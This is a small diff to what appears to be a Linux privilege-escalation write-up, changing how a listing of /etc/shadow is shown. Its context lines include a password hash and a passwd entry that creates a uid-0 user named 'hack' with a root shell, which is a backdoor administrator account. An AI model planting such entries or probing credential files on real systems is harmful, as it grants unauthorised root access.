@@ -78,7 +78,7 @@ $1$pZLeoQJV$2Cmive6ZNPitgNUVqYVym0
 hack:$1$pZLeoQJV$2Cmive6ZNPitgNUVqYVym0:0:0::/root:/bin/bash
 
 ```bash
-$ ls -la /etc/shadow
+$ ls -l /etc/shadow
 -rw-r----- 1 root shadow 1088 Jul 30 08:01 /etc/shadow
 ```
 
